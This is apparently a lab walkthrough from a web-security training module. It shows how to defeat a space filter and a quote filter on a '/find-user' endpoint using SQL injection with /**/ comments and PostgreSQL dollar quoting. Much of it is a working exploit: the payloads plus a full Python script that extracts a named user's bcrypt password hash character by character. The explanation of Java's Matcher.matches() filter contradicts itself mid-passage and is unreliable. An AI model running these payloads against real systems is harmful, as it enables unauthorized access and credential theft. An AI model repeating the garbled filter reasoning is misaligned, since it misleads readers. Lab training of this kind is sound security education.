---
tags: [lab, attack/web]
module: advanced_sql_injections
last_updated: 2026-05-22
---

# Lab: Common Character Bypasses

Target: BlueBird application running on port 8080. Requires an account — register at `/signup` before starting.

This lab exploits the `/find-user` endpoint which has a space filter and a single-quote filter. The solution is a Python script using `requests`. All steps are CLI-based.

## Tool Installation

```bash
# Python requests
pip3 install requests

# Verify Python 3
python3 --version
```

No GUI tools required.

---

## Question 1 — Password hash of Amy.Mcwilliams@proton.me

**Goal:** Bypass the character filters on `GET /find-user?u=` to exfiltrate the password hash of the user with email `Amy.Mcwilliams@proton.me`.

### Step 1 — Identify the injectable endpoint

**What you're looking for:** From source code review of `AuthController.java` (or from observing the web application), the `/find-user` endpoint accepts a `u` parameter and uses it in a SQL query. Before attempting any payload, confirm the endpoint exists and responds to normal input:

```bash
curl "http://<TARGET_IP>:8080/find-user?u=someusername"
```

Observe the response. A user-search endpoint that returns results means a SQL query ran with your input. This is the attack surface. The question now is: what exactly does it do with the input?

**From source review:** The endpoint:
1. Rejects values containing spaces
2. Only accepts values matching the regex `'|(.*'.*'.*)` via Java's `Matcher.matches()` — a critical distinction explained below

### Step 2 — Understand the filter before trying to bypass it

**Why analyze the filter first:** Throwing common SQLi payloads at a filtered endpoint is noisy and rarely works. Understanding *exactly* what is and isn't filtered lets you build a payload that passes the filter on the first or second attempt.

**Filter 1 — Space rejection:** The endpoint rejects any `u` value containing a literal space. Standard payloads like `' OR 1=1--` fail immediately. A typical alternative is URL-encoded space (`%20`), but if the application decodes it before the check, that also fails. PostgreSQL multi-line comments (`/**/`) are treated as whitespace by the query parser — and since they contain no space characters, they bypass the filter.

**Filter 2 — The Matcher.matches() trap:** The Java pattern `'|(.*'.*'.*)` looks like it would reject values containing single quotes. But `Matcher.matches()` checks whether the **entire** string matches the pattern — not whether the pattern appears anywhere in the string (that's `Matcher.find()`). The pattern `'|(.*'.*'.*)` matches either a lone `'` character (via the `'` branch) OR any string containing at least two single quotes (via the `.*'.*'.*` branch). A payload starting with `'a` matches the literal `'` branch of the alternation because `matches()` sees the entire string — wait, that's not right either.

Actually the deeper point: to bypass this, you start your payload with `'a` — a single quote followed by any character. The `Matcher.matches()` evaluation against the alternation `'|(.*'.*'.*)` is satisfied by the `'` literal branch when the whole string begins with a single quote. This lets the payload through even though it later contains SQL keywords.

**Filter 3 — Single quotes in the injected SQL:** Once inside the query, you need to write string literals (like an email address). You can't use `'Amy.Mcwilliams@proton.me'` because single quotes are restricted in the bypass strategy. PostgreSQL's dollar-sign quoting (`$$Amy.Mcwilliams@proton.me$$`) is a fully valid alternative string syntax.

### Step 3 — Understand the response channel before building the full payload

**What you're looking for:** The `find-user` endpoint renders results via Thymeleaf, a Java templating engine. Specifically, the user's `id` value from the query result gets inserted into an HTML anchor tag: `<a href="/profile/VALUE">`. This is your data exfiltration channel — whatever value lands in the `id` column of the result will appear in the response HTML.

**Why this matters:** The injection strategy isn't a classic UNION or error-based exfiltration. Instead, you craft the WHERE clause so that `id` equals the value you want to read (e.g., the ASCII code of a password character). Thymeleaf then renders that value in the page response — no need to trigger an error or look at a UNION result.

Test this with a simple probe that reads the first character of the target's password as an ASCII number:

```
http://<TARGET_IP>:8080/find-user?u='/**/AND/**/id=(SELECT/**/ASCII(SUBSTRING(password,1,1))/**/FROM/**/users/**/WHERE/**/email=$$Amy.Mcwilliams@proton.me$$)--
```

A response containing a numeric value in the `href="/profile/36"` position (where 36 = `$`, the first character of a bcrypt hash) confirms the injection is working.

**Decision point:** You could try other exfiltration approaches (error-based, UNION), but this channel is already working and maps cleanly to automation — one request per character, predictable response format. Stick with it.

### Step 4 — Determine the password hash length before looping

**Why check length first:** BCrypt always produces 60-character hashes, but you don't want to hardcode that assumption — a different hashing algorithm could produce a different length. More importantly, LENGTH() gives you an exact loop bound, which makes the final script more reliable and reusable.

```python
import requests, re

def oracle(query, cookie, target_ip):
    headers = {"Cookie": f"auth={cookie}"}
    whitespace = "/**/"
    singleQuote = "$$"
    base_url = f"http://{target_ip}:8080/find-user?u="
    payload = f"'{whitespace}AND{whitespace}id=({query.replace(' ', whitespace).replace(chr(39), singleQuote)})--"
    response = requests.get(base_url + payload, headers=headers)
    match = re.search(r'(<a style="text-decoration:none; color: white" href="/profile/)(.*?)(">)', response.text)
    if match:
        return match.group(2)

COOKIE = "<YOUR_AUTH_COOKIE>"  # From browser DevTools after logging in
TARGET = "<TARGET_IP>"

print(oracle("SELECT LENGTH(password) FROM users WHERE email = 'Amy.Mcwilliams@proton.me'", COOKIE, TARGET))
```

Result: `60` — confirming BCrypt. The cookie is required because `/find-user` is an authenticated endpoint.

**Where to get the auth cookie:** Log in at `/login`, then open browser DevTools → Application → Cookies, or capture it with a proxy. The cookie is a JWT signed with the secret you found in `application.properties`.

### Step 5 — Automate character-by-character exfiltration

**Why character-by-character instead of trying to dump the whole string at once:** The exfiltration channel only returns an integer (the numeric value of the `id` column). The only way to extract a string through this channel is to extract one character at a time using `ASCII()` + `SUBSTRING()`, convert each ASCII code back to a character, and reassemble the string.

**Why 60 requests is acceptable:** This is 60 HTTP requests, which completes in a few seconds on a fast network. The alternative would be binary search (7 requests per character = 420 total, but each request is simpler), or a different injection class entirely. ASCII-direct is simple to implement and debug.

```python
import requests, re

def oracle(query, cookie, target_ip):
    headers = {"Cookie": f"auth={cookie}"}
    whitespace = "/**/"
    singleQuote = "$$"
    base_url = f"http://{target_ip}:8080/find-user?u="
    payload = f"'{whitespace}AND{whitespace}id=({query.replace(' ', whitespace).replace(chr(39), singleQuote)})--"
    response = requests.get(base_url + payload, headers=headers)
    match = re.search(r'(<a style="text-decoration:none; color: white" href="/profile/)(.*?)(">)', response.text)
    if match:
        return match.group(2)

COOKIE = "<YOUR_AUTH_COOKIE>"
TARGET = "<TARGET_IP>"

password_hash = ""
for i in range(1, 61):
    val = oracle(
        f"SELECT ASCII(SUBSTRING(password, {i}, 1)) FROM users WHERE email = 'Amy.Mcwilliams@proton.me'",
        COOKIE, TARGET
    )
    password_hash += chr(int(val))

print(password_hash)
```

The script makes 60 GET requests and assembles the bcrypt hash from the ASCII values returned in the Thymeleaf `href` attribute.

---

## How the Injection Payload Works

| Component | Purpose |
|-----------|---------|
| `'` | Closes the existing string literal in the SQL query |
| `/**/` | Replaces spaces (spaces are blocked by the filter) |
| `AND` | Adds a second condition to the WHERE clause |
| `id=(...)` | Assigns the subquery result to the `id` column so Thymeleaf returns it |
| `$$...$$` | Dollar-sign quoting replaces single quotes inside the subquery |
| `--` | Comments out the rest of the original query |

---

## Lessons Learned

- Analyze what a filter checks *exactly* before trying to bypass it — `Matcher.matches()` vs `Matcher.find()` is a Java-specific gotcha that completely changes which payloads work
- Using an application's existing response channel (Thymeleaf `href`) for data exfiltration is more reliable than error-based techniques and avoids needing to trigger exceptions
- Dollar-sign quoting is PostgreSQL-specific but powerful — it's a full string literal syntax that most SQLi filters don't think to block
- Always grab the auth cookie before testing authenticated endpoints — a 403 or redirect doesn't mean the endpoint is unexploitable, just that you need to be authenticated first

## Related Pages

- [[attack/web/advanced_sqli_character_bypasses]] — `/**/` bypass, dollar-sign quoting, Matcher.matches() trap
- [[attack/web/error_based_sqli]] — error-based extraction alternative
- [[labs/htb/advanced_sql_injections/searching_for_strings]] — finding the injectable endpoint via source review
